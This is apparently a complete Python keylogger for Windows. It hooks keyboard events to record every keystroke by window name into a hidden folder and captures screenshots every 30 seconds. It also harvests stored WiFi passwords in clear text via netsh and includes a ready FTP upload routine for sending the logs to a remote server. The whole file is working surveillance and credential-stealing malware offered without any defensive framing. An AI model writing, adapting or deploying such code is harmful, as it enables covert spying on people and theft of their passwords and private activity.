import pyHook, pythoncom, os, getpass, time, subprocess, re, cv2
from PIL import ImageGrab
from ftplib import FTP  # for uploading the file to an FTP server
from datetime import datetime

"""Setting Variables"""
currentuser = getpass.getuser()  # Get the username of the currently logged in user
currentline = ""  # This is used to store a buffer of keypresses
windowname = ""  # Used to store the name of the window being typed in
todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'C:\\Hidden\\' + currentuser + '_' + todays_date + '.txt'
starttime = time.time()

"""Creating Filepaths"""
logpath = r'C:\Hidden'
if not os.path.exists(logpath):
    os.makedirs(logpath)
screenshotpath = (r'C:\Hidden\Screenshots\\' + currentuser)
if not os.path.exists(screenshotpath):
    os.makedirs(screenshotpath)


def pastWiFiHarvest():

    passwords = dict()  # Create dictionary to store SSID / password combos
    netshOutput = subprocess.check_output("netsh wlan show profile", shell=True).split('\n')  # Get stored WiFi profiles
    Names = list()  # Create a list to hold SSID names

    for line in netshOutput:
        line = line.split(':')  # Split the output of the netsh command to isolate the SSID name
        try:
            Names.append(line[1].strip())  # If a name existed, add it to the list of names
        except:
            pass  # Do nothing if a name didn't exist
    for SSID in Names:
        try:
            # Get a detailed netsh output for each SSID, with the key in clear text.
            output = subprocess.check_output("netsh wlan show profile name=" + SSID + " key=clear", shell=True)
            # Use regular expressions to strip out just the key
            output = re.findall('Key Content(.*)\n', output)[0].strip().split(':')[1].strip()
            passwords[SSID] = output  # Create the SSID as a dictionary key with the password as the value
        except:
            pass  # Do nothing if no password is found

    PassDoc = open('C:\\Hidden\\Past_WiFi_Passwords_' + currentuser + '.txt', 'a+')
    for x in passwords:
        PassDoc.write("SSID = " + x + "\nPassword = " + passwords[x] + "\n\n")
    PassDoc.close()  # Create a new text file and write the SSID / password combos to it.

def TakeScreenshot():
    global currentuser
    image = ImageGrab.grab()  # Copy the currently viewed screen into the image variable
    image.save('C:\\Hidden\Screenshots\\' + currentuser + '\\' + datetime.now().strftime('%Y%m%d_%H%M%S') + '.png' )


def uploadftp():
    ftpserver = FTP('FTP Server address')  # Add an FTP server address here
    ftpserver.login('FTP Username', 'FTP password') # Add the logon details for the FTP server here
    ftpserver.storbinary("STOR "+ currentuser + '_' + todays_date + ".txt", open(file_name, 'r'))
    ftpserver.close()
    return


def saveline(line):
    newfile = open(file_name, 'a+')
    newfile.write(line)
    newfile.close()
    # uploadftp()
    """ Uncomment to include the FTP upload function.  Adding it here would replace the file on the FTP server
    everytime a new line is created. This could be called elsewhere in the code to lower the frequency and reduce
    network traffic"""


def OnKeyboardEvent(event):
    global currentline, windowname, starttime

    if time.time() - starttime > 30:  # Takes a screenshot every 30 seconds
        TakeScreenshot()
        starttime = time.time()  # Reset the counter to 0

    if windowname != event.WindowName:  # Check if typing in a new window
        if currentline != "":  # Check to make sure nothing is in the buffer waiting to be added to the log
            currentline += '\n'  # Add a new line if characters are waiting in the buffer
            saveline(currentline)  # Add files in the buffer from a previous window to the log

        currentline = ""  # clear the line buffer now that any previous lines have been saved
        saveline('\n-----WindowName: ' + event.WindowName + '-----\n')  # add the new window name to the file
        windowname = event.WindowName  # set the current window name to be checked next time

    if event.Ascii == 13 or event.Ascii == 9:  # Check if Enter or Tab is pressed
        currentline += '\n'  # Add new line to the buffer if it is
        saveline(currentline)  # Save the buffer to the log
        currentline = ""  # clear the line buffer
        return True  # exit

    if event.Ascii == 8:  # Check if backspace is pressed
        currentline = currentline[:-1]  # Delete the last typed character
        return True  # exit

    if event.Ascii < 32 or event.Ascii > 126:  # Check if a non ASCII character is pressed
        if event.Ascii == 0:  # unknown character (arrow key, shift, ctrl, alt)
            pass  # do nothing
        else:
            currentline = currentline + '\n' + str(event.Ascii) + '\n'
    else:
        currentline += chr(event.Ascii)  # add typed character to the buffer

    return True  # pass event to other handlers

pastWiFiHarvest()
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()